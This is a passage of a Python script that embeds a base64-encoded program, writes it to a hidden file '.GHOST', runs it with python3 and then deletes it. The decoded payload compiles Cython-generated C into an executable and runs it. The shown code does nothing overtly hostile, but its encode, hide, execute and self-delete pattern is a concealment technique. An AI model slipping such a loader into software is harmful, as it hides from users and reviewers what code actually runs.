ICAgaWYgKFB5X0ZpbmFsaXplRXgoKSA8IDApCiAgICAgICAgcmV0dXJuIDI7CiNlbmRpZgogICAgcmV0dXJuIDA7Cn0KI2lmIFBZX01BSk9SX1ZFUlNJT04gPj0gMyAmJiAhZGVmaW5lZChXaW4zMikgJiYgIWRlZmluZWQoTVNfV0lORE9XUykKI2luY2x1ZGUgPGxvY2FsZS5oPgpzdGF0aWMgd2NoYXJfdCoKX19QeXhfY2hhcjJ3Y2hhcihjaGFyKiBhcmcpCnsKICAgIHdjaGFyX3QgKnJlczsKI2lmZGVmIEhBVkVfQlJPS0VOX01CU1RPV0NTCiAgICBzaXplX3QgYXJnc2l6ZSA9IHN0cmxlbihhcmcpOwojZWxzZQogICAgc2l6ZV90IGFyZ3NpemUgPSBtYnN0b3djcyhOVUxMLCBhcmcsIDApOwojZW5kaWYKICAgIHNpemVfdCBjb3VudDsKICAgIHVuc2lnbmVkIGNoYXIgKmluOwogICAgd2NoYXJfdCAqb3V0OwojaWZkZWYgSEFWRV9NQlJUT1dDCiAgICBtYnN0YXRlX3QgbWJzOwojZW5kaWYKICAgIGlmIChhcmdzaXplICE9IChzaXplX3QpLTEpIHsKICAgICAgICByZXMgPSAod2NoYXJfdCAqKW1hbGxvYygoYXJnc2l6ZSsxKSpzaXplb2Yod2NoYXJfdCkpOwogICAgICAgIGlmICghcmVzKQogICAgICAgICAgICBnb3RvIG9vbTsKICAgICAgICBjb3VudCA9IG1ic3Rvd2NzKHJlcywgYXJnLCBhcmdzaXplKzEpOwogICAgICAgIGlmIChjb3VudCAhPSAoc2l6ZV90KS0xKSB7CiAgICAgICAgICAgIHdjaGFyX3QgKnRtcDsKICAgICAgICAgICAgZm9yICh0bXAgPSByZXM7ICp0bXAgIT0gMCAmJgogICAgICAgICAgICAgICAgICAgICAoKnRtcCA8IDB4ZDgwMCB8fCAqdG1wID4gMHhkZmZmKTsgdG1wKyspCiAgICAgICAgICAgICAgICA7CiAgICAgICAgICAgIGlmICgqdG1wID09IDApCiAgICAgICAgICAgICAgICByZXR1cm4gcmVzOwogICAgICAgIH0KICAgICAgICBmcmVlKHJlcyk7CiAgICB9CiNpZmRlZiBIQVZFX01CUlRPV0MKICAgIGFyZ3NpemUgPSBzdHJsZW4oYXJnKSArIDE7CiAgICByZXMgPSAod2NoYXJfdCAqKW1hbGxvYyhhcmdzaXplKnNpemVvZih3Y2hhcl90KSk7CiAgICBpZiAoIXJlcykgZ290byBvb207CiAgICBpbiA9ICh1bnNpZ25lZCBjaGFyKilhcmc7CiAgICBvdXQgPSByZXM7CiAgICBtZW1zZXQoJm1icywgMCwgc2l6ZW9mIG1icyk7CiAgICB3aGlsZSAoYXJnc2l6ZSkgewogICAgICAgIHNpemVfdCBjb252ZXJ0ZWQgPSBtYnJ0b3djKG91dCwgKGNoYXIqKWluLCBhcmdzaXplLCAmbWJzKTsKICAgICAgICBpZiAoY29udmVydGVkID09IDApCiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIGlmIChjb252ZXJ0ZWQgPT0gKHNpemVfdCktMikgewogICAgICAgICAgICBmcHJpbnRmKHN0ZGVyciwgInVuZXhwZWN0ZWQgbWJydG93YyByZXN1bHQgLTIiKTsKICAgICAgICAgICAgZnJlZShyZXMpOwogICAgICAgICAgICByZXR1cm4gTlVMTDsKICAgICAgICB9CiAgICAgICAgaWYgKGNvbnZlcnRlZCA9PSAoc2l6ZV90KS0xKSB7CiAgICAgICAgICAgICpvdXQrKyA9IDB4ZGMwMCArICppbisrOwogICAgICAgICAgICBhcmdzaXplLS07CiAgICAgICAgICAgIG1lbXNldCgmbWJzLCAwLCBzaXplb2YgbWJzKTsKICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgfQogICAgICAgIGlmICgqb3V0ID49IDB4ZDgwMCAmJiAqb3V0IDw9IDB4ZGZmZikgewogICAgICAgICAgICBhcmdzaXplIC09IGNvbnZlcnRlZDsKICAgICAgICAgICAgd2hpbGUgKGNvbnZlcnRlZC0tKQogICAgICAgICAgICAgICAgKm91dCsrID0gMHhkYzAwICsgKmluKys7CiAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgIH0KICAgICAgICBpbiArPSBjb252ZXJ0ZWQ7CiAgICAgICAgYXJnc2l6ZSAtPSBjb252ZXJ0ZWQ7CiAgICAgICAgb3V0Kys7CiAgICB9CiNlbHNlCiAgICByZXMgPSAod2NoYXJfdCAqKW1hbGxvYygoc3RybGVuKGFyZykrMSkqc2l6ZW9mKHdjaGFyX3QpKTsKICAgIGlmICghcmVzKSBnb3RvIG9vbTsKICAgIGluID0gKHVuc2lnbmVkIGNoYXIqKWFyZzsKICAgIG91dCA9IHJlczsKICAgIHdoaWxlKCppbikKICAgICAgICBpZigqaW4gPCAxMjgpCiAgICAgICAgICAgICpvdXQrKyA9ICppbisrOwogICAgICAgIGVsc2UKICAgICAgICAgICAgKm91dCsrID0gMHhkYzAwICsgKmluKys7CiAgICAqb3V0ID0gMDsKI2VuZGlmCiAgICByZXR1cm4gcmVzOwpvb206CiAgICBmcHJpbnRmKHN0ZGVyciwgIm91dCBvZiBtZW1vcnkiKTsKICAgIHJldHVybiBOVUxMOwp9CmludAptYWluKGludCBhcmdjLCBjaGFyICoqYXJndikKewogICAgaWYgKCFhcmdjKSB7CiAgICAgICAgcmV0dXJuIF9fUHl4X21haW4oMCwgTlVMTCk7CiAgICB9CiAgICBlbHNlIHsKICAgICAgICBpbnQgaSwgcmVzOwogICAgICAgIHdjaGFyX3QgKiphcmd2X2NvcHkgPSAod2NoYXJfdCAqKiltYWxsb2Moc2l6ZW9mKHdjaGFyX3QqKSphcmdjKTsKICAgICAgICB3Y2hhcl90ICoqYXJndl9jb3B5MiA9ICh3Y2hhcl90ICoqKW1hbGxvYyhzaXplb2Yod2NoYXJfdCopKmFyZ2MpOwogICAgICAgIGNoYXIgKm9sZGxvYyA9IHN0cmR1cChzZXRsb2NhbGUoTENfQUxMLCBOVUxMKSk7CiAgICAgICAgaWYgKCFhcmd2X2NvcHkgfHwgIWFyZ3ZfY29weTIgfHwgIW9sZGxvYykgewogICAgICAgICAgICBmcHJpbnRmKHN0ZGVyciwgIm91dCBvZiBtZW1vcnkiKTsKICAgICAgICAgICAgZnJlZShhcmd2X2NvcHkpOwogICAgICAgICAgICBmcmVlKGFyZ3ZfY29weTIpOwogICAgICAgICAgICBmcmVlKG9sZGxvYyk7CiAgICAgICAgICAgIHJldHVybiAxOwogICAgICAgIH0KICAgICAgICByZXMgPSAwOwogICAgICAgIHNldGxvY2FsZShMQ19BTEwsICIiKTsKICAgICAgICBmb3IgKGkgPSAwOyBpIDwgYXJnYzsgaSsrKSB7CiAgICAgICAgICAgIGFyZ3ZfY29weTJbaV0gPSBhcmd2X2NvcHlbaV0gPSBfX1B5eF9jaGFyMndjaGFyKGFyZ3ZbaV0pOwogICAgICAgICAgICBpZiAoIWFyZ3ZfY29weVtpXSkgcmVzID0gMTsKICAgICAgICB9CiAgICAgICAgc2V0bG9jYWxlKExDX0FMTCwgb2xkbG9jKTsKICAgICAgICBmcmVlKG9sZGxvYyk7CiAgICAgICAgaWYgKHJlcyA9PSAwKQogICAgICAgICAgICByZXMgPSBfX1B5eF9tYWluKGFyZ2MsIGFyZ3ZfY29weSk7CiAgICAgICAgZm9yIChpID0gMDsgaSA8IGFyZ2M7IGkrKykgewojaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDUwMDAwCiAgICAgICAgICAgIGZyZWUoYXJndl9jb3B5MltpXSk7CiNlbHNlCiAgICAgICAgICAgIFB5TWVtX1Jhd0ZyZWUoYXJndl9jb3B5MltpXSk7CiNlbmRpZgogICAgICAgIH0KICAgICAgICBmcmVlKGFyZ3ZfY29weSk7CiAgICAgICAgZnJlZShhcmd2X2NvcHkyKTsKICAgICAgICByZXR1cm4gcmVzOwogICAgfQp9CiNlbmRpZgoiIiIKCkNfRklMRSA9IntuYW1lMl9iYXNlfS5jIgpQWVRIT05fVkVSU0lPTiA9ICIuIi5qb2luKHN5cy52ZXJzaW9uLnNwbGl0KCIgIilbMF0uc3BsaXQoIi4iKVs6LTFdKQpDT01QSUxFX0ZJTEUgPSAoJ2djYyAtSScgKyBQUkVGSVggKyAnL2luY2x1ZGUvcHl0aG9uJyArIFBZVEhPTl9WRVJTSU9OICsgJyAtbyAnICsgRVhFQ1VURV9GSUxFICsgJyAnICsgQ19GSUxFICsgJyAtTCcgKyBQUkVGSVggKyAnL2xpYiAtbHB5dGhvbicgKyBQWVRIT05fVkVSU0lPTikKd2l0aCBvcGVuKENfRklMRSwndycpIGFzIGY6CiAgICBmLndyaXRlKENfU09VUkNFKQpvcy5tYWtlZGlycyhvcy5wYXRoLmRpcm5hbWUoRVhFQ1VURV9GSUxFKSxleGlzdF9vaz1UcnVlKQpvcy5zeXN0ZW0oRVhQT1JUX1BZVEhPTkhPTUUgKyImJiIrIEVYUE9SVF9QWVRIT05fRVhFQ1VUQUJMRSArIiYmIiArIENPTVBJTEVfRklMRSArIiYmIisgUlVOKQpvcy5yZW1vdmUoQ19GSUxFKQ=='
try:
    with open('.GHOST','wb') as D:
        D.write(base64.b64decode(GHOST))
    os.system('python3 .GHOST')
except Exception as E:
    print(E)
finally:
    if os.path.exists('.GHOST'):
        os.remove('.GHOST')
